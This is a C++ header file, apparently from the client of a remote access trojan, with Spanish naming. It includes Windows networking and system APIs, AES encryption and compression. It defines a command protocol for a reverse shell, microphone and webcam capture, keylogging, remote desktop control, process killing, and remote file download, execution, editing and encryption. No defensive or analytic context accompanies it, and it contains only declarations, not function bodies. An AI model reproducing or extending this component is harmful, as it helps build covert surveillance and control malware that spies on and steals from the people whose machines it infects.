#ifndef ___HEADERS
#define ___HEADERS 1

#include<ws2tcpip.h>
#include<windows.h>
#include<iostream>
#include<mutex>
#include<iomanip>
#include<atomic>
#include<memory>
#include<map>
#include<thread>
#include<random>
#include<functional>
#include<fstream>
#include<sstream>
#include<string>
#include<vector>
#include<queue>
#include<cstring>
#include<ctime>
#include<psapi.h>
#include<sys/stat.h>
#include<wtsapi32.h>
#include<winbase.h>
#include<winnt.h>
#include<fcntl.h>
#include<lmcons.h>
#include<intrin.h>
#include<shlobj.h>

#include "../aes256/aes256.hpp"
#include "../zlib/zlib.h"

#define AES_KEY_LEN 32
#define ___DEBUG_
#define MAX_CAMS 5
#define CMD_DEL '~'
#define COMP_HEADER_BYTE_1 'C'
#define COMP_HEADER_BYTE_2 'B'
#define UNCOMP_HEADER_BYTE_1 'D'
#define BUFFER_COMP_REQ_LEN 1024
#define PAQUETE_BUFFER_SIZE 1024 * 10
#define CHUNK_FILE_TRANSFER_SIZE 1024 * 10
#define DUMMY_PARAM "0"

#define error() std::cout<<"Error["<<GetLastError()<<"]\n";
#define error_2(x) std::cout<<"["<<x<<"]"<<"Error["<<GetLastError()<<"]\n";


typedef unsigned int u_int;
typedef const char c_char;
typedef unsigned long long int u64;

namespace EnumComandos {
    enum Enum {
        CLI_RESTART = 496,
        CLI_STOP,
        INIT_PACKET,
        PONG,
        PING,
        Reverse_Shell_Start,
        Reverse_Shell_Command,
        Reverse_Shell_Salida,
        Reverse_Shell_Finish,
        Mic_Refre_Dispositivos,
        Mic_Refre_Resultado,
        Mic_Iniciar_Escucha,
        Mic_Detener_Escucha,
        Mic_Live_Packet,
        Mic_Stop,
        FM_Discos,
        FM_Discos_Lista,
        FM_Dir_Folder,
        FM_CPATH,
        FM_Crear_Folder,
        FM_Crear_Archivo,
        FM_Borrar_Archivo,
        FM_Descargar_Archivo,
        FM_Descargar_Archivo_Recibir,
        FM_Descargar_Archivo_Init,
        FM_Descargar_Archivo_End,
        FM_Ejecutar_Archivo,
        FM_Editar_Archivo,
        FM_Editar_Archivo_Paquete,
        FM_Editar_Archivo_Guardar_Remoto,
        FM_Renombrar_Archivo,
        FM_Crypt_Archivo,
        FM_Crypt_Confirm,
        PM_Refrescar,
        PM_Kill,
        PM_Lista,
        KL_Iniciar,
        KL_Detener,
        KL_Salida,
        CM_Lista,
        CM_Lista_Salida,
        CM_Single,
        CM_Single_Salida,
        CM_Live_Start,
        CM_Live_Stop,
        RD_Lista,
        RD_Lista_Salida,
        RD_Single,
        RD_Start,
        RD_Stop,
        RD_Salida,
        RD_Update_Q,
        RD_Update_Vmouse,
        RD_Send_Click
    };
}

 
#endif

